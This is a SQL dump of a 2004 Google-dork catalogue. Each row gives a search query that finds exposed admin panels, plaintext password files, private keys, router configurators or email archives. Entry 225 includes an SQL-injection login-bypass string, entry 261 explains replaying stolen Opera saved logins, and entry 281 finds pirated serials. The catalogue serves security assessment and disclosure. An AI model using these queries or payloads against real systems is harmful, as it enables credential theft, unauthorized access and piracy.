(190, 'inurl:pls/admin_/gateway.htm', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=inurl%3Apls%2Fadmin_%2Fgateway.htm+', 2050, '2004-04-28', 'This is a default login portal used by Oracle. In addition to the fact that this file can be used to footprint a web server and determine it''s version and software, this page has been targeted in many vulnerability reports as being a source of an SQL injection vulnerability. This problem, when exploited can lead to unauthorized privileges to the databse. In addition, this page may allow unauthorized modification of parameters on the server.', '2004-04-28', NULL, NULL),
(192, 'intitle:"Gateway Configuration Menu"', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=intitle%3A%22Gateway+Configuration+Menu%22', 1711, '2004-04-28', 'This is a normally protected configuration menu for Oracle Portal Database Access Descriptors (DADs) and Listener settings. This page is normally password protected, but Google has uncovered sites which are not protected. Attackers can make changes to the servers found with this query.', '2004-04-28', NULL, NULL),
(193, 'intitle:"Remote Desktop Web Connection" inurl:tsweb', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=intitle%3ARemote.Desktop.Web.Connection+inurl%3Atsweb', 2188, '2004-04-28', 'This is the login page for Microsoft''s Remote Desktop Web Connection, which allows remote users to connect to (and optionally control) a user''s desktop. Although authentication is built into this product, it is still possible to run this service without authentication. Regardless, this search serves as a footprinting mechanisms for an attacker.', '2004-04-28', NULL, NULL),
(194, 'inurl:php inurl:hlstats intext:"Server Username"', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=inurl%3Aphp+inurl%3Ahlstats+intext%3A%22Server+Username%22', 4404, '2004-04-28', 'This page shows the halflife stat script and reveals the username to the system. Table structure, database name and recent SQL queries are also shown on most systems.', '2004-04-28', NULL, NULL),
(195, 'intext:"Tobias Oetiker" "traffic analysis"', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=intext%3A%22Tobias+Oetiker%22+%22traffic+analysis%22', 1487, '2004-05-03', 'This is the MRTG traffic analysis pages. This page lists information about machines on the network including CPU load, traffic statistics, etc. This information can be useful in mapping out a network.', '2004-05-03', NULL, NULL),
(196, 'inurl:tdbin', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=inurl%3Atdbin', 1333, '2004-05-03', 'This is the default directory for TestDirector (http://www.mercuryinteractive.com/products/testdirector/). This program contains sensitive information including software defect data which should not be publically accessible.', '2004-05-03', NULL, NULL),
(198, 'inurl:perform filetype:ini', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=inurl%3Aperform+filetype%3Aini&btnG=Search', 1381, '2004-05-03', 'Displays the perform.ini file used by the popular irc client mIRC. Often times has channel passwords and/or login passwords for nickserv.', '2004-05-03', NULL, NULL),
(199, 'intitle:"index of" intext:globals.inc', 'http://www.google.com/search?hl=nl&ie=UTF-8&oe=UTF-8&q=intitle%3A%22index+of%22+intext%3Aglobals.inc&lr=', 1903, '2004-05-03', 'contains plaintext user/pass for mysql database', '2004-05-03', NULL, NULL),
(201, 'inurl:"smb.conf" intext:"workgroup" filetype:conf conf', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=inurl%3A%22smb.conf%22+intext%3A%22workgroup%22+filetype%3Aconf+conf', 1268, '2004-05-04', 'These are samba configuration files. They include information about the network, trust relationships, user accounts and much more. Attackers can use this information to recon a network.', '2004-05-04', NULL, NULL),
(202, 'intitle:"Samba Web Administration Tool" intext:"Help Workgroup"', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=intitle%3A%22Samba+Web+Administration+Tool%22+intext%3A%22Help+Workgroup%22', 2134, '2004-05-04', 'This search reveals wide-open samba web adminitration servers. Attackers can change options on the server.', '2004-05-04', NULL, NULL),
(203, 'filetype:properties inurl:db intext:password', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=filetype%3Aproperties+inurl%3Adb+intext%3Apassword', 1634, '2004-05-04', 'The db.properties file contains usernames, decrypted passwords and even hostnames and ip addresses of database servers. This is VERY severe, earning the highest danger rating.', '2004-05-04', NULL, NULL),
(204, 'inurl:names.nsf?opendatabase', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=inurl%3Anames.nsf%3Fopendatabase', 1593, '2004-05-04', 'A Login portal for Lotus Domino servers. Attackers can attack this page or use it to gather information about the server.', '2004-05-04', NULL, NULL),
(206, 'filetype:conf inurl:firewall -intitle:cvs', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=filetype%3Aconf+inurl%3Afirewall+-intitle%3Acvs', 1316, '2004-05-05', 'These are firewall configuration files. Although these are often examples or sample files, in many cases they can still be used for information gathering purposes.', '2004-05-05', NULL, NULL),
(207, 'filetype:inc intext:mysql_connect', 'http://www.google.com/search?hl=en&ie=UTF-8&oe=UTF-8&q=filetype%3Ainc+intext%3Amysql_connect', 2017, '2004-05-05', 'INC files have PHP code within them that contain unencrypted usernames, passwords, and addresses for the corresponding databases.  Very dangerous stuff.  The mysql_connect file is especially dangerous because it handles the actual connection and authentication with the database.', '2004-05-05', NULL, NULL),
(208, '"HTTP_FROM=googlebot" googlebot.com "Server_Software="', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=%22HTTP_FROM%3Dgooglebot%22++googlebot.com+%22Server_Software%3D%22', 2892, '2004-05-06', 'These pages contain trace information that was collected when the googlebot crawled a page. The information can include many different things such as path names, header information, server software versions and much more. Attackers can use information like this to formulate an attack against a site.', '2004-05-06', NULL, NULL),
(209, '"Request Details" "Control Tree" "Server Variables"', 'http://www.google.com/search?sourceid=navclient&ie=UTF-8&oe=UTF-8&q=%22Request+Details%22+%22Control+Tree%22+%22Server+Variables%22', 1909, '2004-05-06', 'These pages contain a great deal of information including path names, session ID''s, stack traces, port numbers, ip addresses, and much much more. Attackers can use this information to formulate a very advanced attack against these targets.', '2004-05-06', NULL, NULL),
(210, 'filetype:reg reg +intext:"defaultusername" +intext:"defaultpassword"', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=filetype%3Areg+reg+%2Bintext%3A%22defaultusername%22+%2Bintext%3A%22defaultpassword%22', 1525, '2004-05-07', 'These pages display windows registry keys which reveal passwords and/or usernames.', '2004-05-07', NULL, NULL),
(211, 'inurl:metaframexp/default/login.asp | intitle:"Metaframe XP Login"', 'http://www.google.com/search?hl=en&q=inurl%3Ametaframexp%2Fdefault%2Flogin.asp+%7C+intitle%3A%22Metaframe+XP+Login%22', 1319, '2004-05-10', 'These are Citrix Metaframe login portals. Attackers can use these to profile a site and can use insecure setups of this application to access the site.', '2004-05-10', NULL, NULL),
(212, 'inurl:/Citrix/Nfuse17/', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=inurl%3A%2FCitrix%2FNfuse17%2F+', 1239, '2004-05-10', 'These are Citrix Metaframe login portals. Attackers can use these to profile a site and can use insecure setups of this application to access the site.', '2004-05-10', NULL, NULL),
(213, 'filetype:wab wab', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=filetype%3Awab+wab+', 1407, '2004-05-10', 'These are Microsoft Outlook Mail address books. The information contained will vary, but at the least an attacker can glean email addresses and contact information.', '2004-05-10', NULL, NULL),
(214, 'filetype:reg reg HKEY_CURRENT_USER username', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=filetype%3Areg+reg+HKEY_CURRENT_USER+username', 7224, '2004-05-11', 'This search finds registry files from the Windows Operating system. Considered the "soul" of the system, these files, and snippets from these files contain sensitive information, in this case usernames and/or passwords.', '2004-05-11', NULL, NULL),
(215, 'filetype:reg reg HKEY_CURRENT_USER SSHHOSTKEYS', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=filetype%3Areg+reg+HKEY_CURRENT_USER+SSHHOSTKEYS+', 1554, '2004-05-11', 'This search reveals SSH host key fro the Windows Registry. These files contain information about where the user connects including hostnames and port numbers, and shows sensitive information such as the SSH host key in use by that client.', '2004-05-11', NULL, NULL),
(216, 'inurl:/tmp', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=inurl%3A%2Ftmp+', 2433, '2004-05-11', 'Many times, this search will reveal temporary files and directories on the web server. The information included in these files and directories will vary, but an attacker could use this information in an information gathering campaign.', '2004-05-11', NULL, NULL),
(218, 'intitle:"eMule *" intitle:"- Web Control Panel" intext:"Web Control Panel" "Enter your password here."', 'http://www.google.com/search?q=intitle:%22eMule+*%22+intitle:%22-+Web+Control+Panel%22+intext:%22Web+Control+Panel%22+%22Enter+your+password+here.%22&num=100&hl=en&lr=&c2coff=1&filter=0', 1650, '2004-05-11', 'This iks the login page for eMule, the p2p file-sharing program. These pages forego the login name, prompting only for a password. Attackers can use this to profile a target, gather information and ultimately upload or download files from the target (which is a function of the emule program itself)', '2004-05-11', NULL, NULL),
(219, 'inurl:"webadmin" filetype:nsf', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=inurl%3A%22webadmin%22+filetype%3Ansf', 1286, '2004-05-11', 'This is a standard login page for Domino Web Administration.', '2004-05-11', NULL, NULL),
(221, 'filetype:eml eml +intext:"Subject" +intext:"From" +intext:"To"', 'http://www.google.com/search?hl=en&lr=&q=filetype%3Aeml+eml+%2Bintext%3A%22Subject%22+%2Bintext%3A%22From%22+%2Bintext%3A%22To%22', 1577, '2004-05-12', 'These are oulook express email files which contain emails, with full  headers. The information in these emails can be useful for information gathering about a target.', '2004-05-12', NULL, NULL),
(222, 'inurl:vtund.conf intext:pass -cvs', 'http://www.google.com/search?hl=en&q=inurl%3Avtund.conf+intext%3Apass+-cvs', 1473, '2004-05-12', 'Theses are vtund configuration files (http://vtun.sourceforge.net). Vtund is an encrypted tunneling program. The conf file holds plaintext passwords. Many sites use the default password, but some do not. Regardless, attackers can use this information to gather information about a site.', '2004-05-12', NULL, NULL),
(223, 'inurl:login filetype:swf swf', 'http://www.google.com/search?hl=en&lr=&q=inurl%3Alogin+filetype%3Aswf+swf', 1484, '2004-05-12', 'This search reveals sites which may be using Shockwave (Flash) as a login mechanism for a site. The usernames and passwords for this type of login mechanism are often stored in plaintext inside the source of the .swl file.', '2004-05-12', NULL, NULL),
(225, 'intitle:guestbook "advanced guestbook 2.2 powered"', 'http://www.google.com/search?hl=en&lr=&q=intitle%3Aguestbook+%22advanced+guestbook+2.2+powered%22', 2924, '2004-05-12', 'Advanced Guestbook v2.2 has an SQL injection problem which allows unauthorized access. AttackerFrom there, hit "Admin" then do the following:Leave username field blank.For password, enter this exactly:'') OR (''a'' = ''aYou are now in the Guestbook''s Admin section.http://www.securityfocus.com/bid/10209', '2004-05-12', NULL, NULL),
(226, 'intitle:"300 multiple choices"', 'http://www.google.com/search?q=intitle:%22300+multiple+choices%22+intext:server.at&hl=en&lr=&ie=UTF-8&start=90&sa=N', 1371, '2004-05-13', 'This search shows sites that have the 300 error code, but also reveal a server tag at the bottom of the page that an attacker could use to profile a system.', '2004-05-13', NULL, NULL),
(227, 'intitle:"index of" mysql.conf OR mysql_config', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&q=intitle%3A%22index+of%22+mysql.conf+OR+mysql_config', 1575, '2004-05-13', 'This file contains port number, version number and path info to MySQL server.', '2004-05-13', NULL, NULL),
(228, 'filetype:lic lic intext:key', 'http://www.google.com/search?num=100&hl=en&lr=&safe=off&q=filetype%3Alic+lic+intext%3Akey&btnG=Search', 2078, '2004-05-13', 'License files for various software titles that may contain contact info and the product version, license, and registration in a .LIC file.', '2004-05-13', NULL, NULL),
(229, '"please log in"', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&q=%22please+log+in%22', 1295, '2004-05-13', 'This is a simple search for a login page. Attackers view login pages as the "front door" to a site, but the information about where this page is stored and how it is presented can provide clues about breaking into a site.', '2004-05-13', NULL, NULL),
(232, 'intitle:"Dell Remote Access Controller"', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&q=intitle%3A%22Dell+Remote+Access+Controller%22', 1176, '2004-05-17', 'This is the Dell Remote Access Controller that allows remote administration of a Dell server.', '2004-05-17', NULL, NULL),
(233, 'filetype:vsd vsd network -samples -examples', 'http://www.google.com/search?hl=en&lr=&q=filetype%3Avsd+vsd+network+-samples+-examples&btnG=Search', 1606, '2004-05-13', 'Reveals network maps (or any other kind you seek) that can provide sensitive information such as internal IPs, protocols, layout, firewall locations and types, etc. Attackers can use these files in an information gathering campaign.', '2004-05-13', NULL, NULL),
(235, 'filetype:log cron.log', 'http://www.google.com/search?hl=en&ie=UTF-8&q=filetype:log+cron.log&spell=1', 1265, '2004-05-14', 'Displays logs from cron, the *nix automation daemon.  Can be used to determine backups, full and realtive paths, usernames, IP addresses and port numbers of trusted network hosts, or just about anything the admin of the box decides to automate.  An attacker could use this information to possibly determine what extra vulnerable services are running on the machine, to find the location of backups, and, if the sysadmin uses cron to backup their logfiles, this cron log will give that away too.', '2004-05-14', NULL, NULL),
(236, 'filetype:log access.log -CVS', 'http://www.google.com/search?hl=en&ie=UTF-8&q=filetype%3Alog+access.log+-CVS&btnG=Google+Search', 1381, '2004-05-14', 'These are http server access logs which contain all sorts of information ranging from usernames and passwords to trusted machines on the network to full paths on the server.  Could be VERY useful in scoping out a potential target.', '2004-05-14', NULL, NULL),
(237, 'filetype:blt blt +intext:screenname', 'http://www.google.com/search?&ie=utf-8&oe=utf-8&q=filetype%3Ablt+blt+%2Bintext%3Ascreenname', 1297, '2004-05-14', 'Reveals AIM buddy lists, including screenname and who''s on their ''buddy'' list and their ''blocked'' list.', '2004-05-14', NULL, NULL),
(238, 'filetype:dat "password.dat"', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&q=filetype%3Adat+%22password.dat%22', 4939, '2004-05-17', 'This file contains plaintext usernames and password. Deadly information in the hands of an attacker.', '2004-05-17', NULL, NULL),
(239, 'intitle:intranet inurl:intranet +intext:"phone"', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&q=intitle%3Aintranet+inurl%3Aintranet+%2Bintext%3A%22phone%22', 1480, '2004-05-17', 'These pages are often private intranet pages which contain phone listings and email addresses. These pages can be used as a sort of online "dumpster dive".', '2004-05-17', NULL, NULL),
(240, 'filetype:conf slapd.conf', 'http://www.google.com/search?sourceid=navclient&ie=UTF-8&oe=UTF-8&q=filetype%3Aconf+slapd%2Econf', 1737, '2004-05-17', 'slapd.conf is the file that contains all the configuration for OpenLDAP, including the root password, all in clear text. Other useful information that can be gleaned from this file includes full paths of other related installed applications, the r/w/e permissions for various files, and a bunch of other stuff.', '2004-05-17', NULL, NULL),
(241, 'inurl:php.ini filetype:ini', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&q=inurl%3Aphp.ini+filetype%3Aini', 1593, '2004-05-17', 'The php.ini file contains all the configuration for how PHP is parsed on a server.  It can contain default database usernames, passwords, hostnames, IP addresses, ports, initialization of global variables and other information.  Since it is found by default in /etc, you might be able to find a lot more unrelated information in the same directory.', '2004-05-17', NULL, NULL),
(243, 'filetype:pem intext:private', 'http://www.google.com/search?sourceid=navclient&ie=UTF-8&oe=UTF-8&q=filetype%3Apem+pem+intext%3Aprivate', 1653, '2004-05-17', 'This search will find private key files... Private key files are supposed to be, well... private.', '2004-05-17', NULL, NULL),
(244, '"Mecury Version" "Infastructure Group"', 'http://www.google.com/search?hl=en&ie=UTF-8&safe=off&q=%22Mercury+Version%22+%22Infrastructure+Group%22&spell=1', 1589, '2004-05-18', 'Mecury is a centralized ground control program for research satellites.  This query simply locates servers running this software.  As it seems to run primarily on PHP and MySQL, there are many possible vulnerabilities associated with it.', '2004-05-18', NULL, NULL),
(245, 'filetype:conf inurl:proftpd.conf -sample', 'http://www.google.com/search?q=filetype%3Aconf+inurl%3Aproftpd.conf+-sample+&sourceid=mozilla-search&start=0&start=0&ie=utf-8&oe=utf-8', 7423, '2004-05-20', 'A standard FTP configuration file that provides far too many details about how the server is setup, including installation paths,  location of logfiles, generic username and associated group, etc', '2004-05-20', NULL, NULL),
(247, '"error found handling the request" cocoon filetype:xml', 'http://www.google.com/search?num=100&q=%22error+found+handling+the+request%22+cocoon+filetype%3Axml', 1521, '2004-07-29', 'Cocoon is an XML publishing framework. It allows you to define XML documents and transformations to be applied on it, to eventually generate a presentation format of your choice (HTML, PDF, SVG). For more information read http://cocoon.apache.org/2.1/overview.htmlThis Cocoon error displays library functions, cocoon version number, and full and/or relative path names.', '2004-07-29', NULL, NULL),
(248, 'intitle:"Big Sister" +"OK Attention Trouble"', 'http://www.google.com/search?num=100&hl=en&lr=&ie=UTF-8&safe=off&q=intitle%3A%22Big+Sister%22+%2B%22OK+Attention+Trouble%22&btnG=Search', 2412, '2004-05-24', 'This search reveals Internal network status information about services and hosts.', '2004-05-24', NULL, NULL),
(249, 'inurl:"/cricket/grapher.cgi"', 'http://www.google.com/search?num=100&hl=en&lr=&ie=UTF-8&safe=off&q=inurl%3A%22%2Fcricket%2Fgrapher.cgi%22&btnG=Search', 1409, '2004-05-24', 'This search reveals information about internal networks, such as configuration, services, bandwidth.', '2004-05-24', NULL, NULL),
(250, 'inurl:"cacti" +inurl:"graph_view.php" +"Settings Tree View" -cvs -RPM', 'http://www.google.com/search?num=100&hl=en&lr=&ie=UTF-8&safe=off&q=inurl%3A%22cacti%22+%2Binurl%3A%22graph_view.php%22+%2B%22Settings+Tree+View%22+-cvs+-RPM&btnG=Search', 1374, '2004-05-24', 'This search reveals internal network info including architecture, hosts and services available.', '2004-05-24', NULL, NULL),
(251, 'intitle:"System Statistics" +"System and Network Information Center"', 'http://www.google.com/search?num=100&hl=en&lr=&ie=UTF-8&safe=off&q=intitle%3A%22System+Statistics%22+%2B%22System+and+Network+Information+Center%22&btnG=Search', 1450, '2004-05-24', 'This search reveals internal network information including network configuratino, ping times, services,  and host info.', '2004-05-24', NULL, NULL),
(253, 'filetype:inc dbconn', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&q=filetype%3Ainc+dbconn', 2365, '2004-05-26', 'This file contains the username and password the website uses to connect to the db.  Lots of these Google results don''t take you straight to ''dbconn.inc'', instead they show you an error message -- that shows you exactly where to find dbconn.inc!!', '2004-05-26', NULL, NULL),
(254, 'inurl:"slapd.conf" intext:"credentials" -manpage -"Manual Page" -man: -sample', 'http://www.google.com/search?num=100&hl=en&lr=&ie=UTF-8&safe=off&q=inurl%3A%22slapd.conf%22+intext%3A%22credentials%22+-manpage+-%22Manual+Page%22+-man%3A+-sample&btnG=Search', 1504, '2004-05-25', 'slapd.conf is the configuration file for slapd, the opensource LDAP deamon. The key "credentinals" contains passwords in cleartext.', '2004-05-25', NULL, NULL),
(255, 'inurl:"slapd.conf" intext:"rootpw" -manpage -"Manual Page" -man: -sample', 'http://www.google.com/search?num=100&hl=en&lr=&ie=UTF-8&safe=off&q=inurl%3A%22slapd.conf%22+intext%3A%22rootpw%22++-manpage+-%22Manual+Page%22+-man%3A+-sample&btnG=Search', 1474, '2004-05-25', 'slapd.conf is the configuration file for slapd, the opensource LDAP deamon. You can view a cleartext or crypted password for the "rootdn".', '2004-05-25', NULL, NULL),
(256, 'filetype:ini ws_ftp pwd', 'http://www.google.com/search?num=100&hl=en&lr=&ie=UTF-8&safe=off&q=filetype%3Aini+%2Bws_ftp+%2Bpwd&btnG=Search', 4661, '2004-05-26', 'The encryption method used in WS_FTP is _extremely_ weak. These files can be found with the "index of" keyword or by searching directly for the PWD= value inside the configuration file.', '2004-05-26', NULL, NULL),
(257, 'inurl:forward filetype:forward -cvs', 'http://www.google.com/search?num=100&hl=en&lr=&ie=UTF-8&safe=off&q=inurl%3Aforward+filetype%3Aforward+-cvs&btnG=Search', 1286, '2004-05-26', 'Users on *nix boxes can forward their mail by placing a .forward file in their home directory. These files reveal email addresses.', '2004-05-26', NULL, NULL),
(258, '"Invision Power Board Database Error"', 'http://www.google.com/search?num=100&hl=en&lr=&ie=UTF-8&safe=off&q=%22Invision+Power+Board+Database+Error%22&btnG=Search', 1365, '2004-05-28', 'These are SQL error messages, ranging from to many connections, access denied to user xxx, showing full path info to the php files etc.. There is an exploitable bug in version 1.1 of this software and the current version is 1.3 available for download on the site.', '2004-05-28', NULL, NULL),
(259, 'filetype:netrc password', 'http://www.google.com/search?num=100&hl=en&lr=&ie=UTF-8&safe=off&q=filetype%3Anetrc+password&btnG=Search', 1996, '2004-05-26', 'The .netrc file is used for automatic login to servers. The passwords are stored in cleartext.', '2004-05-26', NULL, NULL),
(260, 'signin filetype:url', 'http://www.google.com/search?num=100&hl=en&lr=&ie=UTF-8&safe=off&q=signin+filetype%3Aurl&btnG=Search', 1653, '2004-05-26', 'Javascript for user validation  is a bad idea as it shows cleartext user/pass combos. There is one googledork who forgot that.', '2004-05-26', NULL, NULL),
(261, 'filetype:dat wand.dat', 'http://www.google.com/search?num=100&hl=en&lr=&ie=UTF-8&safe=off&q=filetype%3Adat+wand.dat&btnG=Search', 2106, '2004-05-27', 'The world-famous web-browser Opera has the ability to save the password for you, and it call the system "Magic Wand". When on a site, you can save the username and password to the magic wand, then on the site again, click the magic wand icon and it will fill it out automaticly for you. What a joy! Opera saves this file on you''r computer, it is located (on winXP) here: D:\\Documents and Settings\\Peefy\\Programdata\\Opera\\Opera75\\profile\\wand.dat for me offcourse, change it so its suitable for you..But, if you don''t have a descrambler or whatever, the passwords arent cleartext, but you have to put the wand file in the location specified above, then open opera, click tools, Wand Passwords, then see the URL''s saved, then go to theese URL''s and click the wand button.', '2004-05-27', NULL, NULL),
(263, 'inurl:/eprise/', 'http://www.google.com/search?num=100&hl=en&lr=&ie=UTF-8&safe=off&q=inurl%3A%2Feprise%2F+&btnG=Search', 1099, '2004-05-26', 'silkRoad Eprise is a dynamic content management product that simplifies the flow of content to a corporate website. The software requires  NT 4, Windows 2000 or Solaris and is used by high-profile corporations. If an attacker cuts the url after the eprise/ directory, he is presented with the admin logon screen.', '2004-05-26', NULL, NULL),
(265, 'filetype:cfg mrtg "target[*]" -sample -cvs -example', 'http://www.google.com/search?num=100&hl=en&lr=&ie=UTF-8&safe=off&q=filetype%3Acfg+mrtg+%22target%5B*%5D%22+-sample+-cvs+-example&btnG=Search', 1645, '2004-06-02', 'Mrtg.cfg is the configuration file for polling SNMP enabled devices. The community string (often ''public'') is found in the line starting with target:#Target[test]: 1.3.6.1.4.1.2021.10.1.5.1&amp;1.3.6.1.4.1.2021.10.1.5.2:public@localhostRemember not all targets are SNMP devices. Users can monitor CPU info for example.', '2004-06-02', NULL, NULL),
(266, 'filetype:ldb admin', 'http://www.google.com/search?hl=en&ie=UTF-8&q=filetype%3Aldb+admin&btnG=Google+Search', 2191, '2004-06-02', 'According to filext.com, the ldb file is "A lock file is used to keep muti-user databases from being changed in the same place by two people at the same time resulting in data corruption." These Access lock files contain the username of the last user and they ALWAYS have the same filename and location as the database. Attackers can substitute mdb for ldb and dowload the database file.', '2004-06-02', NULL, NULL),
(267, 'inurl:search/admin.php', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&q=inurl%3Ainstall.php+intitle%3AphpMySearch&btnG=Search', 1584, '2004-05-30', 'phpMySearch is a personal search engine that one can use to provide a search feature for one''s own Web site. With this search an attacker can find admin logon screens. This software does not seem to be very popular yet, but would allow attackers to access indexed information about the host if compromised.', '2004-05-30', NULL, NULL),
(268, 'filetype:r2w r2w', 'http://www.google.com/search?num=100&hl=en&lr=&ie=UTF-8&safe=off&q=filetype%3Ar2w+r2w&btnG=Search', 1100, '2004-06-04', 'WRQ Reflection gives you a standard desktop that includes web- and Windows-based terminal emulation and X Windows products. Terminal emulation settings are saved to a configuration file, depending on the version called r1w, r2w, or r4w. If an attacker loads these files he can access the main login screen on mainframe systems for example.', '2004-06-04', NULL, NULL),
(269, 'filetype:php inurl:vAuthenticate', 'http://www.google.com/search?num=100&hl=en&lr=&ie=UTF-8&safe=off&q=filetype%3Aphp+inurl%3AvAuthenticate&btnG=Search', 1784, '2004-06-04', 'vAuthenticate is a multi-platform compatible PHP and MySQL script which allows creation of new user accounts new user groups, activate/inactivate groups or individual accounts, set user level, etc. There are two admin users by default with an easy to guess password. The backup admin user can *not* be deleted. There is also a test account with the same password that can not be deleted.An attacker can find the default passwords by downloading the software and browsing the .sql files. Default passwords are seldom changed if the user is not *forced* to change them first before using the sofware. This software doesn''t enforce such a rule.', '2004-06-04', NULL, NULL),
(270, 'intitle:"ZyXEL Prestige Router" "Enter password"', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&q=intitle%3A%22ZyXEL+Prestige+Router%22+%22Enter+password%22+', 1666, '2004-06-04', 'This is the main authentication screen for the ZyXEL Prestige Router.', '2004-06-04', NULL, NULL),
(271, '"Welcome to the Prestige Web-Based Configurator"', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&q=%22Welcome+to+the+Prestige+Web-Based+Configurator%22+', 2034, '2004-06-04', 'This is the configuration screen for a Prestige router. This page indicates that the router has not yet been setup and any web user can make changes to the router.', '2004-06-04', NULL, NULL),
(272, 'intitle:"ADSL Configuration page"', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&q=intitle%3A%22ADSL+Configuration+page%22', 1834, '2004-06-04', 'This is the status screen for the Solwise ADSL modem. Information available from this page includes IP addresses, MAC addresses, subnet mask, firware version of the modem. Attackers can use this information to formulate an attack.', '2004-06-04', NULL, NULL),
(273, '"Version Info" "Boot Version" "Internet Settings"', 'http://www.google.com/search?&ie=UTF-8&oe=UTF-8&q=%22Version+Info%22+%22Boot+Version%22+%22Internet+Settings%22', 1777, '2004-06-04', 'This is the status page for a Belkin Cable/DSL gateway. Information can be retrieved from this page including IP addresses, WAN addresses, MAC addresses, firmware versions, serial numbers, subnet masks, firewall settings, encryption settings, NAT settings and SSID. Attackers can use this information to formulate an attack.', '2004-06-04', NULL, NULL),
(274, 'filetype:sql +"IDENTIFIED BY" -cvs', 'http://www.google.com/search?num=100&hl=en&lr=&ie=UTF-8&safe=off&q=filetype%3Asql+%2B%22IDENTIFIED+BY%22+-cvs&btnG=Search', 1552, '2004-06-04', 'Database maintenance is often automated by use of .sql files wich may contain many lines of batched SQL commands. These files are often used to create databases and set or alter permissions. The passwords used can be either encrypted or even plaintext.An attacker can use these files to acquire database permissions that normally would not be given to the masses.', '2004-06-04', NULL, NULL),
(275, 'filetype:sql password', 'http://www.google.com/search?num=100&hl=en&lr=&ie=UTF-8&safe=off&q=filetype%3Asql+password&btnG=Search', 2507, '2004-06-04', 'Database maintenance is often automated by use of .sql files that contain many lines of batched SQL commands. These files are often used to create databases and set or alter permissions. The passwords used can be either encrypted or even plaintext.An attacker can use these files to acquire database permissions that normally would not be given to the masses.', '2004-06-04', NULL, NULL),
(276, 'intitle:"Welcome Site/User Administrator" "Please select the language" -demos', 'http://www.google.com/search?num=100&hl=en&lr=&ie=UTF-8&safe=off&q=intitle%3A%22Welcome+Site%2FUser+Administrator%22+%22Please+select+the+language%22+-demos&btnG=Search', 1141, '2004-06-10', 'service providers worldwide use Ensim''s products to automate the  management of their hosting services. Currently it hosts more than 500,000 Web sites and five million mailboxes.Ensim''s uses a control panel GUI to manage the servers. It has four levels of priviledges. The software runs on TCP port 19638, but access is normally limited to trusted hosts only. A local exploit was found by badc0ded.org in virthostmail, part of Ensim WEBppliance Pro.', '2004-06-10', NULL, NULL);
INSERT INTO `dorks` (`dork_id`, `title`, `link`, `hits`, `date`, `description`, `dateSubmission`, `vulnSoftVersion`, `exploitID`) VALUES
(277, 'filetype:pwd service', 'http://www.google.com/search?num=100&hl=en&lr=&ie=UTF-8&safe=off&q=filetype%3Apwd+service&btnG=Search', 2295, '2004-06-10', 'Microsoft Frontpage extensions appear on virtually every type of scanner. In the late 90''s people thought they where hardcore by defacing sites with Frontpage. Today, there are still vulnerable servers found with Google. An attacker can simply take advantage from administrators who ''forget'' to set up the policies for Frontpage extensions. An attacker can also search for ''filetype:pwd users''.', '2004-06-10', NULL, NULL),
(280, 'POWERED BY HIT JAMMER 1.0!', 'http://www.google.com/search?hl=en&ie=UTF-8&q=POWERED+BY+HIT+JAMMER+1.0%21&btnG=Google+Search', 6938, '2004-06-06', 'Hit Jammer is a Unix compatible script that allows you to manage the content and traffic exchange and make web changes, all without needing HTML. It is typicaly used by the underground sites on the Net who "pay for surfing ads" and advertise spam services or software.An attacker can find these sites by searching for the typical "powered by hit jammer !" frase on the bottom of the main page. Then if he changes the URL to www.target.com/admin/admin.php he is taken to the admin panel. Hit Jammer administrators are warned to protect this page with the .htaccess logon procedure, but many fail to do just that. In such cases, customer information like email addresses and passwords are in clear view of the attacker. Since human beings often use one simple password for many things this is a very dangerous practice.', '2004-06-06', NULL, NULL),
(281, '94FBR "ADOBE PHOTOSHOP"', 'http://www.google.com/search?num=100&hl=en&lr=&ie=UTF-8&safe=off&q=94FBR+%22ADOBE+PHOTOSHOP%22&btnG=Search', 1697, '2004-06-10', '94FBR is part of many serials. An malicious user would only have to change the programm name (photoshop in this example) in this search to find a perfectly valid serial.Other values to look for are: GC6J3. GTQ62. FP876. D3DX8.', '2004-06-10', NULL, NULL),
(282, 'inurl:zebra.conf intext:password -sample -test -tutorial -download', 'http://www.google.com/search?hl=en&ie=UTF-8&q=inurl%3Azebra.conf+intext%3Apassword+-sample+-test+-tutorial+-download&btnG=Google+Search', 1599, '2004-06-10', 'GNU Zebra is free software that manages TCP/IP based routing protocols.  It supports BGP-4 protocol as well as RIPv1, RIPv2 and OSPFv2.The zebra.conf uses the same format as the cisco config files. There is an enable password (plain text or encrypted) and ipv6 tunnel definitions, hostnames, ethernet interface names, ip routing information, etc.', '2004-06-10', NULL, NULL),
